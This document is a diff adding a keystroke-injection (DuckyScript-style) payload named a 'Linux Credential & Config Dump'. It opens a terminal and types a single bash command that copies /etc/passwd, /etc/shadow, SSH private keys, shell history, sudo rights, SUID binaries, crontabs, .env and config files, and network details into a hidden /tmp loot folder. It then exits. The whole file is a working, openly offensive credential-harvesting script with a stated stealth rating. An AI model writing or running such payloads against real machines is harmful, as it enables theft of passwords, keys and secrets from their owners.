@@ -1,0 +1,14 @@
+REM ============================================
+REM  FU PERSON | Linux Credential & Config Dump
+REM  FLLC - by PERSON FU
+REM  Time: ~10 seconds | Stealth: MEDIUM
+REM  Grabs SSH keys, passwords, configs, history
+REM ============================================
+DELAY 1000
+CTRL ALT t
+DELAY 800
+STRING bash -c 'D="/tmp/.loot_$(date +%s)";mkdir -p "$D";echo "=== LINUX CRED DUMP ===" > "$D/results.txt";echo "Time: $(date)" >> "$D/results.txt";echo "User: $(whoami)" >> "$D/results.txt";echo "Host: $(hostname)" >> "$D/results.txt";echo "" >> "$D/results.txt";echo "=== /etc/passwd ===" >> "$D/results.txt";cat /etc/passwd >> "$D/results.txt" 2>/dev/null;echo "=== /etc/shadow ===" >> "$D/results.txt";cat /etc/shadow >> "$D/results.txt" 2>/dev/null;echo "=== SSH KEYS ===" >> "$D/results.txt";for f in ~/.ssh/id_* ~/.ssh/config ~/.ssh/known_hosts; do [ -f "$f" ] && cp "$f" "$D/" && echo "[FOUND] $f" >> "$D/results.txt"; done;echo "=== BASH HISTORY ===" >> "$D/results.txt";cat ~/.bash_history >> "$D/results.txt" 2>/dev/null;cat ~/.zsh_history >> "$D/results.txt" 2>/dev/null;echo "=== SUDO CHECK ===" >> "$D/results.txt";sudo -l 2>/dev/null >> "$D/results.txt";echo "=== SUID BINARIES ===" >> "$D/results.txt";find / -perm -4000 2>/dev/null | head -30 >> "$D/results.txt";echo "=== CRONTABS ===" >> "$D/results.txt";crontab -l >> "$D/results.txt" 2>/dev/null;cat /etc/crontab >> "$D/results.txt" 2>/dev/null;echo "=== ENV FILES ===" >> "$D/results.txt";find /home /opt /var/www -name ".env" -o -name "*.conf" -o -name "*.cfg" 2>/dev/null | head -20 >> "$D/results.txt";echo "=== NETWORK ===" >> "$D/results.txt";ip a >> "$D/results.txt" 2>/dev/null;ss -tlnp >> "$D/results.txt" 2>/dev/null;echo "[DONE] Loot in $D" >> "$D/results.txt"' &
+ENTER
+DELAY 300
+STRING exit
+ENTER
